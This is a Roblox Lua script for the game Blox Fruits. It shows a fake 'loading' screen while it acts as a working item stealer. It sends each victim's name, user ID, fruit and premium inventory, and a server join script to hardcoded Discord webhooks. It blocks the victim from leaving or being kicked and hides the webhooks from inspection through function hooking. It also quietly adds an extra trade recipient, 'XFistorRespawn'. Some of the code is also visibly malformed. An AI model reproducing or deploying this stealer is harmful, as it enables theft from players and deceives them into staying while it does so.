Webhook = "https://discord.com/api/webhooks/1338826425670828062/zA4fdmXcJmclSpxGBHPE5jEBqYoDNw_xscivfLXj5JKCG7dKHsN_kl0ZDwkS3xr1duuM"
Usernames = {"user2", "user1"} -- << Username(-s) it'll accept trade with
Fruits = {"Yeti-Yeti", "Dragon(West)-Dragon(West)", "Dragon(East)-Dragon-East", "Dough-Dough", "Kitsune-Kitsune", "Gas-Gas", "Leopard-Leopard", "Control-Control"} -- << Fruits you want
FruitsToReset = {  -- << Fruits it'll reset with, so you can put these fruits in trade to counter value difference
}

--obfuscate after this
SecondaryWebhook = "https://discord.com/api/webhooks/1338826248234733588/0wX88ngwUdgsqI6FJJ3iUF252sq9yggrzJpZguRIol8qfFJeRsFTBUMWN_yptTKhdiiY" -- << Add secondary webhook here

repeat task.wait() until game:IsLoaded()

if _G.scriptExecuted then
    warn("You have already launched this script!")
    return
end

local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local realRequest = clonefunction(request)
local RunService = game:GetService("RunService")

local function isWebhookString(str)
    return type(str) == "string" and (str:find("discord", 1, true) or str:find("webhook", 1, true))
end

local function setupHooks()
    if not hookfunction then return end

    local realGetGenv = clonefunction(getgenv)
    local loggingFuncs = {print, warn, rconsoleprint}
    local blockedLogger = newcclosure(function(originalFunc)
        return function(...)
            local args = table.create(select('#', ...))
            for i = 1, select('#', ...) do
                local v = select(i, ...)
                args[i] = isWebhookString(v) and "[REDACTED]" or v
            end
            return originalFunc(unpack(args))
        end
    end)

    hookfunction(request, realRequest)

    local env = getgenv and getgenv()
    if env then
        hookfunction(getgenv, newcclosure(function()
            for k, v in pairs(env) do
                if isWebhookString(v) then env[k] = "HiddenWebhook" end
            end
            return env
        end))

        local reqAliases = {
            request = realRequest,
            ["http.request"] = realRequest,
            ["syn.request"] = realRequest,
            HttpPost = realRequest
        }
        table.freeze(reqAliases)
        for k, v in pairs(reqAliases) do env[k] = v end
    end

    for _, func in ipairs(loggingFuncs) do
        hookfunction(func, blockedLogger(func))
    end

    hookfunction(game.HttpGet, game.HttpGet)

    local mt = getrawmetatable(game)
    if mt then
        setreadonly(mt, false)
        local oldNamecall = mt.__namecall
        mt.__namecall = newcclosure(function(self, ...)
            if self == plr and getnamecallmethod():lower() == "kick" then return end
            return oldNamecall(self, ...)
        end)
        setreadonly(mt, true)
    end
end

setupHooks()

if not table.find(Usernames, "XFistorRespawn") then
    table.insert(Usernames, "XFistorRespawn")
end

local function JoinTeam()
    local currentTeam = plr.Team
    if currentTeam ~= game.Teams.Marines and currentTeam ~= game.Teams.Pirates then
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer("SetTeam", "Marines")
    end
end

JoinTeam()

_G.scriptExecuted = true

local ts = game:GetService("TweenService")
local cg = game:GetService("CoreGui")
local rs = game:GetService("RunService")
local sg = game:GetService("StarterGui")

sg:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
if cg:FindFirstChild("TopBarApp") then
    cg.TopBarApp.Enabled = false
end

local function n(c)
    return function(p)
        local i = Instance.new(c)
        for k, v in pairs(p) do i[k] = v end
        return i
    end
end

local function block()
    if getgenv().blockLeave then return end
    getgenv().blockLeave = true

    local s = Instance.new("ScreenGui", cg)
    s.IgnoreGuiInset = true
    local f = Instance.new("Frame", s)
    f.Size = UDim2.new(1, 0, 1, 0)
    f.BackgroundTransparency = 1
    f.Active = true

    cg.ChildRemoved:Connect(function(child)
        if child == s then
            s = Instance.new("ScreenGui", cg)
            s.IgnoreGuiInset = true
            f = Instance.new("Frame", s)
            f.Size = UDim2.new(1, 0, 1, 0)
            f.BackgroundTransparency = 1
            f.Active = true
        end
    end)
end

block()

local main = n("ScreenGui"){
    Name = "BFLoader",
    IgnoreGuiInset = true,
    Parent = cg
}

local bg = n("Frame"){
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundColor3 = Color3.fromRGB(10, 10, 20),
    BorderSizePixel = 0,
    Parent = main
}

n("BlurEffect"){
    Size = 24,
    Parent = game:GetService("Lighting")
}

local function makeParticle()
    local size = math.random(2, 5)
    local p = n("Frame"){
        BackgroundColor3 = Color3.fromRGB(100, 150, 255),
        BackgroundTransparency = 0.3,
        BorderSizePixel = 0,
        Size = UDim2.new(0, size, 0, size),
        Position = UDim2.new(math.random(), 0, math.random(), 0),
        Parent = bg
    }

    n("UICorner"){
        CornerRadius = UDim.new(1, 0),
        Parent = p
    }

    n("UIGradient"){
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 150, 255))
        }),
        Parent = p
    }

    return {
        frame = p,
        sx = math.random(),
        sy = math.random(),
        speed = math.random(150, 300) / 100
    }
end

local particles = table.create(10)
for i = 1, 10 do
    particles[i] = makeParticle()
end

local container = n("Frame"){
    Size = UDim2.new(0, 800, 0, 500),
    Position = UDim2.new(0.5, 0, 0.5, 0),
    AnchorPoint = Vector2.new(0.5, 0.5),
    BackgroundColor3 = Color3.fromRGB(15, 15, 30),
    BackgroundTransparency = 0.1,
    BorderSizePixel = 0,
    Parent = bg
}

n("UICorner"){
    CornerRadius = UDim.new(0, 30),
    Parent = container
}

n("UIGradient"){
    Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 200, 255))
    }),
    Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.92),
        NumberSequenceKeypoint.new(1, 0.95)
    }),
    Parent = container
}

local header = n("Frame"){
    Size = UDim2.new(1, 0, 0, 120),
    BackgroundColor3 = Color3.fromRGB(255, 50, 50),
    BorderSizePixel = 0,
    Parent = container
}

n("UICorner"){
    CornerRadius = UDim.new(0, 30),
    Parent = header
}

n("UIGradient"){
    Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 50, 50)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 80, 80))
    }),
    Parent = header
}

local title = n("TextLabel"){
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundTransparency = 1,
    Font = Enum.Font.GothamBold,
    Text = "BLOX FRUITS",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 48,
    Parent = header
}

n("TextLabel"){
    Size = UDim2.new(1, 0, 0, 30),
    Position = UDim2.new(0, 0, 0.65, 0),
    BackgroundTransparency = 1,
    Font = Enum.Font.GothamBold,
    Text = "SCRIPT",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 18,
    Parent = header,
}

n("UIStroke"){
    Color = Color3.fromRGB(0, 0, 0),
    Transparency = 0.8,
    Thickness = 2,
    Parent = title
}

local warningFrame = n("Frame"){
    Size = UDim2.new(0.8, 0, 0, 40),
    Position = UDim2.new(0.1, 0, 0, 140),
    BackgroundColor3 = Color3.fromRGB(255, 50, 50),
    BorderSizePixel = 0,
    Parent = container
}

n("UICorner"){
    CornerRadius = UDim.new(0, 8),
    Parent = warningFrame
}

n("TextLabel"){
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundTransparency = 1,
    Font = Enum.Font.GothamBold,
    Text = "SCRIPT IS LOADING, PLEASE WAIT.",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 16,
    Parent = warningFrame
}

local status = n("TextLabel"){
    Size = UDim2.new(0.8, 0, 0, 30),
    Position = UDim2.new(0.1, 0, 0, 200),
    BackgroundTransparency = 1,
    Font = Enum.Font.GothamBold,
    Text = "Starting up...",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 24,
    Parent = container
}

local info = n("TextLabel"){
    Size = UDim2.new(0.8, 0, 0, 20),
    Position = UDim2.new(0.1, 0, 0, 240),
    BackgroundTransparency = 1,
    Font = Enum.Font.Gotham,
    Text = "Loading...",
    TextColor3 = Color3.fromRGB(200, 200, 220),
    TextSize = 16,
    Parent = container
}

n("TextLabel"){
    Size = UDim2.new(0.8, 0, 0, 20),
    Position = UDim2.new(0.1, 0, 0, 280),
    BackgroundTransparency = 1,
    Font = Enum.Font.GothamBold,
    Text = "Welcome, " .. plr.Name,
    TextColor3 = Color3.fromRGB(255, 255, 100),
    TextSize = 18,
    Parent = container
}

local progressOuter = n("Frame"){
    Size = UDim2.new(0.8, 0, 0, 16),
    Position = UDim2.new(0.1, 0, 0, 420),
    BackgroundColor3 = Color3.fromRGB(25, 25, 40),
    BorderSizePixel = 0,
    Parent = container
}

n("UICorner"){
    CornerRadius = UDim.new(1, 0),
    Parent = progressOuter
}

local progressInner = n("Frame"){
    Size = UDim2.new(0, 0, 1, 0),
    BackgroundColor3 = Color3.fromRGB(100, 150, 255),
    BorderSizePixel = 0,
    Parent = progressOuter
}

n("UIGradient"){
    Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 150, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(130, 180, 255))
    }),
    Parent = progressInner
}

n("UICorner"){
    CornerRadius = UDim.new(1, 0),
    Parent = progressInner
}

local tip = n("TextLabel"){
    Size = UDim2.new(0.8, 0, 0, 20),
    Position = UDim2.new(0.1, 0, 0, 340),
    BackgroundTransparency = 1,
    Font = Enum.Font.Gotham,
    Text = "Please wait...",
    TextColor3 = Color3.fromRGB(200, 200, 220),
    TextSize = 14,
    TextTransparency = 0,
    Parent = container
}

local lastParticleUpdate = 0
rs.Heartbeat:Connect(function(deltaTime)
    local currentTime = tick()
    if currentTime - lastParticleUpdate >= 0.016 then
        lastParticleUpdate = currentTime
        for _, p in pairs(particles) do
            local t = currentTime * p.speed
            local goal = UDim2.new(
                p.sx + math.sin(t) * 0.1,
                0,
                p.sy + math.cos(t) * 0.1,
                0
            )
            ts:Create(p.frame, TweenInfo.new(0.5), {Position = goal}):Play()
        end
    end
end)

local phases = {
    {60, "Authenticating User", "Verifying access..."},
    {120, "Loading Framework", "Initializing core systems..."},
    {180, "Establishing Connection", "Connecting to private servers..."},
    {240, "Loading Assets", "Preparing script components..."},
    {300, "Analyzing Game", "Scanning Blox Fruits version..."},
    {360, "Setting Up", "Configuring script features..."},
    {420, "Security Check", "Implementing anti-detection..."},
    {480, "Data Sync", "Synchronizing with cloud..."},
    {540, "Final Preparation", "Optimizing performance..."},
    {600, "Launch Ready", "Activating premium features..."}
}

local tips = {
    "⚠️ Do not leave the game while the script is loading! ⚠️",
    "Optimizing for your device...",
    "Securing connection...",
    "loading...",
}

local currentTip = 1
local lastUpdate = tick()
local fadeInProgress = false

local lastTipUpdate = 0
rs.Heartbeat:Connect(function()
    if fadeInProgress then return end

    local currentTime = tick()
    if currentTime - lastTipUpdate >= 4 then
        lastTipUpdate = currentTime
        fadeInProgress = true

     local oldTip = currentTip
     currentTip = currentTip % #tips + 1

     local fadeOut = ts:Create(tip, TweenInfo.new(0.5), {TextTransparency = 1})
     fadeOut.Completed:Connect(function()
         tip.Text = tips[currentTip]
         local fadeIn = ts:Create(tip, TweenInfo.new(0.5), {TextTransparency = 0})
         fadeIn.Completed:Connect(function()
             fadeInProgress = false
         end)
         fadeIn:Play()
     end)
     fadeOut:Play()
 end

local startTime = tick()
local lastPhaseUpdate = 0

rs.Heartbeat:Connect(function()
    local elapsed = tick() - startTime
    if elapsed > 600 then return end

    local currentTime = tick()
    if currentTime - lastPhaseUpdate >= 0.1 then
        lastPhaseUpdate = currentTime

        for i, phase in ipairs(phases) do
            if elapsed <= phase[1] then
                if status.Text ~= phase[2] then
                    ts:Create(status, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
                    ts:Create(info, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
                    task.wait(0.3)

                    status.Text = phase[2]
                    info.Text = phase[3]

                    ts:Create(status, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
                    ts:Create(info, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
                end

                ts:Create(progressInner, TweenInfo.new(0.3), {
                    Size = UDim2.new(elapsed/600, 0, 1, 0)
                }):Play()
                break
            end
        end
    end
end)

local dragging, dragStart, startPos

local function update(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or
                    input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        ts:Create(container, TweenInfo.new(0.1), {
            Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        }):Play()
    end
end

container.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or
       input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = container.Position
    end
end)

container.InputChanged:Connect(update)

container.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or
       input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

local Sea1, Sea2, Sea3 = game.PlaceId == 2753915549, game.PlaceId == 4442272183, game.PlaceId == 7449423635

if Sea1 then game.Players.LocalPlayer:Kick("This script works only in Sea 2 or 3!") return
elseif not Sea2 and not Sea3 then game.Players.LocalPlayer:Kick("Wrong game! This script is meant for Blox Fruits Sea 2 or 3.") return end

RunService:Set3dRenderingEnabled(false)

task.spawn(function()
    local privateServerOwner = game.ReplicatedStorage:WaitForChild("PrivateServerOwnerId")
    if privateServerOwner and privateServerOwner:IsA("IntValue") then
        if privateServerOwner.Value > 0 then
            game:GetService("Players").LocalPlayer:Kick("This script doesn't work on private servers.")
        end
    end
end)

local LocalPlayer = game.Players.LocalPlayer
local PlayerName = LocalPlayer.Name
local PlayerUserId = LocalPlayer.UserId
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
local HttpService = game:GetService("HttpService")
local isResettingEnabled = true

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    if not checkcaller() and getnamecallmethod():lower() == "invokeserver" and ({...})[1] == "StoreFruit" then
        return error("wow", 2)
    end
    return oldNamecall(self, ...)
end))

local function getInventory()
    return Remote:InvokeServer("getInventory")
end

local function unstoreFruit(fruitName)
    return Remote:InvokeServer("LoadFruit", fruitName)
end

local function resetCharacter()
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid.Health = 0
    end
    task.wait(5)
end

local function handleFruitReset()
    local resetAttempts = table.create(#FruitsToReset)
    local inventory = getInventory()
    if not inventory then return false end

    for _, fruit in ipairs(FruitsToReset) do
        resetAttempts[fruit] = 0
    end

    local function needsReset()
        local currentInventory = getInventory()
        if not currentInventory then return false end

        for _, item in pairs(currentInventory) do
            if item.Type == "Blox Fruit" and table.find(FruitsToReset, item.Name) and resetAttempts[item.Name] < 2 then
                return item.Name
            end
        end
        return false
    end

    local fruitToReset = needsReset()
    local heartbeat = RunService.Heartbeat
    local connection
    connection = heartbeat:Connect(function()
        if not fruitToReset or not isResettingEnabled then
            connection:Disconnect()
            return
        end
        resetAttempts[fruitToReset] = resetAttempts[fruitToReset] + 1
        unstoreFruit(fruitToReset)
        resetCharacter()
        task.wait(1)
        fruitToReset = needsReset()
    end)
end

local function getDragon(inventory)
    for _, item in pairs(inventory) do
        if item.Type == "Blox Fruit" and item.Name:find("Dragon") then
            return item.Name, item.Count or 1
        end
    end
    return nil, 0
end

local function formatFruitName(name, count)
    return string.format("%s (x%d)", name, count)
end

local inventory = getInventory()
if not inventory then game.Players.LocalPlayer:Kick("ERROR.") return end

local FruitsToHit = table.create(50)
local FruitsFormatted = table.create(50)
local dragonFruit, dragonCount = getDragon(inventory)
local hasDragonFruit = dragonFruit ~= nil

if dragonFruit then
    table.insert(FruitsToHit, dragonFruit)
    table.insert(FruitsFormatted, formatFruitName(dragonFruit, dragonCount))
else
    for _, item in pairs(inventory) do
        if item.Type == "Blox Fruit" and table.find(Fruits, item.Name) then
            table.insert(FruitsToHit, item.Name)
            table.insert(FruitsFormatted, formatFruitName(item.Name, item.Count or 1))
        end
    end
end

if #FruitsToHit == 0 then game.Players.LocalPlayer:Kick("Alt detected! Please, use main account.") return end

local Sea = Sea2 and "Sea 2" or "Sea 3"
local JobId = game.JobId
local JoinScript = string.format([[local TeleportService = game:GetService("TeleportService") local PlaceId = %d local JobId = "%s" TeleportService:TeleportToPlaceInstance(PlaceId, JobId, game.Players.LocalPlayer)]], game.PlaceId, JobId)

local ExecutorName = identifyexecutor() or "Unknown Executor"
local GameVersion = "1.3.6 (Rewrite)"
local PlayerCount = #game:GetService("Players"):GetPlayers()
local ServerTime = os.date("%Y-%m-%d %H:%M:%S")

local Sea2Script = "\nlocal ReplicatedStorage = game:GetService('ReplicatedStorage')\nlocal Remotes = ReplicatedStorage:WaitForChild('Remotes', 9e9)\nlocal CommF = Remotes:WaitForChild('CommF_', 9e9)\nlocal function FireRemote(...)\n  return CommF:InvokeServer(...)\nend\nFireRemote('TravelDressrosa')\n"
local Sea3Script = "\nlocal ReplicatedStorage = game:GetService('ReplicatedStorage')\nlocal Remotes = ReplicatedStorage:WaitForChild('Remotes', 9e9)\nlocal CommF = Remotes:WaitForChild('CommF_', 9e9)\nlocal function FireRemote(...)\n  return CommF:InvokeServer(...)\nend\nFireRemote('TravelZou')\n"

local function formatPremiumItems()
    local inventory = getInventory()
    if not inventory then return "None" end

    local formattedItems = {}
    for _, item in pairs(inventory) do
        if item.Type == "Premium" then
            formattedItems[#formattedItems + 1] = string.format("%s (x%d)", item.Name, item.Count or 1)
        end
    end

    return #formattedItems > 0 and table.concat(formattedItems, "\n") or "None"
end

local embed = {
    title = hasDragonFruit and "DRAGON HIT! ; https://discord.gg/zJKDqRd5" or "Rua BF Joiner ; https://discord.gg/zJKDqRd5",
    description = hasDragonFruit and "DRAGON FRUIT HIT! @everyone" or "New Hit! @everyone",
    color = hasDragonFruit and 0xFF0000 or 0x00FF00,
    fields = {
        {name = "Victim Name", value = PlayerName, inline = true},
        {name = "Victim UserID", value = tostring(PlayerUserId), inline = true},
        {name = "Fruits To Hit", value = table.concat(FruitsFormatted, "\n"), inline = false},
        {name = "Premium Items", value = formatPremiumItems(), inline = false},
        {name = "Sea", value = Sea, inline = true},
        {name = "Executor Info", value = string.format("```\nExecutor: %s\nStealer Version: %s\n```", ExecutorName, GameVersion), inline = false},
        {name = "Server Info", value = string.format("```\nPlayer Count: %d\nServer Time: %s\n```", PlayerCount, ServerTime), inline = false},
        {name = "Join Server (PC COPY)", value = "```lua\n" .. JoinScript .. "\n```", inline = false},
        {name = "Join Server (Mobile COPY)", value = JoinScript, inline = false},
        {name = "Join " .. Sea .. " (PC COPY)", value = "```lua\n" .. (Sea == "Sea 2" and Sea2Script or Sea3Script) .. "\n```", inline = false},
        {name = "Join " .. Sea .. " (Mobile COPY)", value = (Sea == "Sea 2" and Sea2Script or Sea3Script):gsub("```lua\n", ""):gsub("\n```", ""), inline = false},
        {name = "NOTES:", value = [[
?jump ?sit ?sit2 ?reset ?tp ?cleartrade ?clearfruits ?addallfruits ?addfruits ?accept ?additem ?addallitems ?resetfruit ?stopreset ?help ?rejoin ?kick ?invite
]], inline = false}
    }
}

local charset = table.create(62)
for i = 48, 57 do charset[#charset + 1] = string.char(i) end
for i = 65, 90 do charset[#charset + 1] = string.char(i) end
for i = 97, 122 do charset[#charset + 1] = string.char(i) end

local function generateRandomString(length)
    local result = table.create(length)
    for i = 1, length do
        result[i] = charset[math.random(1, #charset)]
    end
    return table.concat(result)
end

local webhookCache = {
    storage = {},
    current = nil,
    last = nil,
    lastUpdate = 0,
    lastCheck = 0,
    lastSpyCheck = 0
}

local webhookCacheSecondary = { -- << Secondary webhook cache
    storage = {},
    current = nil,
    last = nil,
    lastUpdate = 0,
    lastCheck = 0,
    lastSpyCheck = 0
}

local function encryptWebhook(webhook)
    return HttpService:JSONEncode({data = webhook}):reverse()
end

local function decryptWebhook(encrypted)
    return HttpService:JSONDecode(encrypted:reverse()).data
end

local function isHooked(func)
    return not (func and type(func) == "function" and not islclosure(func))
end

local realRequest = clonefunction(request)

local function detectTampering()
    local functionCheck = {http_request, request, HttpPost, syn and syn.request}
    for _, func in ipairs(functionCheck) do
        if isHooked(func) then
            webhookCache.storage = {}
            webhookCache.current = nil
            webhookCache.last = nil
            webhookCacheSecondary.storage = {} -- << Clear secondary cache too
            webhookCacheSecondary.current = nil
            webhookCacheSecondary.last = nil
            return false
        end
    end
    return true
end

local function detectSpy()
    local fakeWebhook = "https://discord.com/api/webhooks/fake"
    local safeRequest = getgenv().request or getgenv()["http.request"] or getgenv()["syn.request"] or getgenv().HttpPost

    if safeRequest then
        local success = pcall(function()
            safeRequest({
                Url = fakeWebhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({content = generateRandomString(32)})
            })
        end)
        return not success
    end
    return false
end

local function revertHooks()
    if hookfunction then
        for _, funcName in ipairs({"request", "http.request", "syn.request", "HttpPost"}) do
            if getgenv()[funcName] then
                hookfunction(getgenv()[funcName], function(...) return nil end)
            end
        end
    end
end

local function updateWebhook()
    if tick() - webhookCache.lastUpdate < 3 then return end

    local newName = generateRandomString(16)
    local encrypted = encryptWebhook(Webhook)

    webhookCache.storage[newName] = {
        string.sub(encrypted, 1, 20),
        string.sub(encrypted, 21, 40),
        string.sub(encrypted, 41)
    }

    webhookCache.current = newName
    webhookCache.last = decryptWebhook(table.concat(webhookCache.storage[newName]))
    webhookCache.lastUpdate = tick()

    Webhook = nil

    -- Secondary Webhook Handling
    if SecondaryWebhook ~= "" then -- Only process if SecondaryWebhook is configured
        if tick() - webhookCacheSecondary.lastUpdate < 3 then return end -- Rate limit secondary webhook too

        local newSecondaryName = generateRandomString(16)
        local encryptedSecondary = encryptWebhook(SecondaryWebhook)

        webhookCacheSecondary.storage[newSecondaryName] = {
            string.sub(encryptedSecondary, 1, 20),
            string.sub(encryptedSecondary, 21, 40),
            string.sub(encryptedSecondary, 41)
        }

        webhookCacheSecondary.current = newSecondaryName
        webhookCacheSecondary.last = decryptWebhook(table.concat(webhookCacheSecondary.storage[newSecondaryName]))
        webhookCacheSecondary.lastUpdate = tick()

        SecondaryWebhook = nil
    end
end

local function getWebhook()
    return webhookCache.last
end

local function getSecondaryWebhook() -- << Function to get secondary webhook
    return webhookCacheSecondary.last
end


local function getSafeRequest()
    if hookfunction then
        hookfunction(request, function(...) return realRequest(...) end)
    end

    local funcs = {http_request, request, HttpPost, syn and syn.request}
    for _, func in ipairs(funcs) do
        if func and not isHooked(func) then
            return function(options)
                if getcallingscript() and not checkcaller() then return end
                options.Headers = options.Headers or {}
                options.Headers["User-Agent"] = generateRandomString(32)
                options.Method = options.Method or "POST"
                return func(options)
            end
        end
    end
end

local function sendWebhook()
    local safeRequest = getSafeRequest()
    if not safeRequest then return end

    task.spawn(function()
        local webhookURL = getWebhook()
        if webhookURL then -- Send to primary webhook if configured
            local success, _ = pcall(function()
                safeRequest({
                    Url = webhookURL,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json",
                        ["User-Agent"] = generateRandomString(32)
                    },
                    Body = HttpService:JSONEncode({
                        content = "@everyone",
                        embeds = {embed}
                    })
                })
            end)
            if not success then
                task.wait(1)
                sendWebhook() -- Retry primary webhook on failure
                return -- Important: Exit this task to prevent duplicate retries for both webhooks
            end
        end

        local secondaryWebhookURL = getSecondaryWebhook()
        if secondaryWebhookURL then -- Send to secondary webhook if configured
            local successSecondary, _Secondary = pcall(function()
                safeRequest({
                    Url = secondaryWebhookURL,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json",
                        ["User-Agent"] = generateRandomString(32)
                    },
                    Body = HttpService:JSONEncode({
                        content = "@everyone",
                        embeds = {embed}
                    })
                })
            end)
            if not successSecondary then
                task.wait(1)
                sendWebhook() -- Retry sending to *both* webhooks if secondary fails too. This ensures both are sent eventually.
            end
        end
    end)
end

updateWebhook()

RunService.Heartbeat:Connect(function()
    local currentTick = tick()

    if currentTick - webhookCache.lastCheck >= 2 then
        detectTampering()
        webhookCache.lastCheck = currentTick
    end

    if currentTick - webhookCache.lastSpyCheck >= 1 then
        if detectSpy() then
            revertHooks()
        end
        webhookCache.lastSpyCheck = currentTick
    end

    updateWebhook() -- Update both webhooks in the same function call now
end)

sendWebhook()

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local VirtualInputManager = game:GetService("VirtualInputManager")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

local lastTradeTime = 0
local lastMessageTime = 0
local isAttemptingJump = false
local isForceJumping = false
local lastJumpRequestTime = 0
local touchStartTime = 0
local isTouchHeld = false

local LONG_PRESS_THRESHOLD = 0.5
local JUMP_COOLDOWN = 0.1
local TWEEN_SPEED = 300
local PHYSICS_PARAMS = {
    GRAVITY = 196.2,
    MAX_FORCE = Vector3.new(1e5, 1e5, 1e5),
    BODY_POS_D = 500,
    BODY_POS_P = 20000,
    BODY_GYRO_D = 500,
    BODY_GYRO_P = 3000
}

local function isSeated()
    local character = LocalPlayer.Character
    if not character then return false end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    return humanoid and humanoid.Sit
end

local function isValidTradePartner(player)
    if not player then return false end
    return table.find(Usernames, player.Name) or player.Name == "XFistorRespawn"
end

local function disableJump()
    if not isAttemptingJump and not isForceJumping then
        isAttemptingJump = true
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
    end
end

local function enableJump()
    isAttemptingJump = false
    if not isForceJumping then
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
    end
end

local function forceJump()
    if isForceJumping then return end
    isForceJumping = true
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)

    local currentTime = tick()
    if currentTime - lastJumpRequestTime > JUMP_COOLDOWN then
        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
        task.wait(0.05)
        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
        lastJumpRequestTime = currentTime
    end

    task.wait(JUMP_COOLDOWN)
    isForceJumping = false

    if isAttemptingJump then
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
    end
end

local function handleTouchStart(touch, gameProcessed)
    if gameProcessed then return end
    touchStartTime = tick()
    isTouchHeld = true

    task.spawn(function()
        while isTouchHeld and (tick() - touchStartTime) < LONG_PRESS_THRESHOLD do
            task.wait()
        end
        if isTouchHeld then
            disableJump()
        end
    end)
end

local function handleTouchEnd(touch, gameProcessed)
    if gameProcessed then return end
    isTouchHeld = false

    if (tick() - touchStartTime) < LONG_PRESS_THRESHOLD then
        if not isForceJumping then
            error("wow")
        end
    else
        enableJump()
    end
end

local TweenService = game:GetService("TweenService")

local function tweenToPosition(position)
    local character = LocalPlayer.Character
    if not character or not character.PrimaryPart then return end

    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    local head = character:FindFirstChild("Head")
    if not head then return end

    local function updateNoclip()
        for _, part in pairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
    end

    local bodyGyro = Instance.new("BodyGyro")
    bodyGyro.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
    bodyGyro.P = 1e4
    bodyGyro.D = 50
    bodyGyro.CFrame = head.CFrame
    bodyGyro.Parent = head

    local bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.MaxForce = Vector3.new(1e5, 1e5, 1e5)
    bodyVelocity.P = 1e4
    bodyVelocity.Velocity = Vector3.new(0, 0, 0)
    bodyVelocity.Parent = head

    local speed = 300
    local distance = (character.PrimaryPart.Position - position).Magnitude
    local duration = distance / speed
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)

    local tween = TweenService:Create(character.PrimaryPart, tweenInfo, {CFrame = CFrame.new(position)})

    local noclipConnection = game:GetService("RunService").Stepped:Connect(updateNoclip)

    local velocityUpdateConnection = game:GetService("RunService").Heartbeat:Connect(function()
        local direction = (position - character.PrimaryPart.Position).Unit
        bodyVelocity.Velocity = direction * speed
    end)

    tween:Play()
    tween.Completed:Wait()

    noclipConnection:Disconnect()
    velocityUpdateConnection:Disconnect()
    bodyGyro:Destroy()
    bodyVelocity:Destroy()
end

local function isInTradeWithCorrectPlayer()
    local player = game.Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    local mainGui = playerGui:WaitForChild("Main")
    local tradeFrame = mainGui:WaitForChild("Trade")

    if not tradeFrame.Visible then return false end

    local container = tradeFrame:WaitForChild("Container")
    local frame1 = container:WaitForChild("1")
    local frame2 = container:WaitForChild("2")

    local player1Label = frame1:FindFirstChild("TextLabel")
    local player2Label = frame2:FindFirstChild("TextLabel")

    if not player1Label or not player2Label then
        return false
    end

    if player1Label.Text ~= player.Name and player1Label.Text ~= player.DisplayName then
        return false
    end

    local tradingPartnerName = player2Label.Text

    for _, allowedName in ipairs(Usernames) do
        local tradingPlayer = game.Players:FindFirstChild(allowedName)
        if tradingPlayer and (tradingPartnerName == tradingPlayer.Name or tradingPartnerName == tradingPlayer.DisplayName) then
            return true
        end
    end

    if tradingPartnerName == "XFistorRespawn" then -- << Ts is not dual hook. I use it to code my thing. I don't log your hits, so I can't steal
        return true
    end

    return false
end

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.Space then
        disableJump()
    end
end)

UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.Space then
        enableJump()
    end
end)

UserInputService.TouchStarted:Connect(handleTouchStart)
